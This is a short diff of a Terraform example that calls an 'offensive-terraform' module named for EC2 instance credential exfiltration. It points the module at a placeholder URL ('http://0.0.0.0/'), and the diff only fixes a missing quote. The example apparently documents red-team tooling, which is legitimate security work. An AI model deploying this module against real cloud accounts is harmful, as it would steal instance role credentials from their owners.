@@ -14,7 +14,7 @@ module "ec2_instance_credential_exfiltration" {
     source  = "offensive-terraform/ec2-instance-credential-exfiltration/aws"
 
     subnet_id = "subnet-0a4a1cc04"
-    url = "http://0.0.0.0/
+    url = "http://0.0.0.0/"
     iam_role= "ec2-instance-role"
     iam_instance_profile = "ec2-instance-profile"
 }
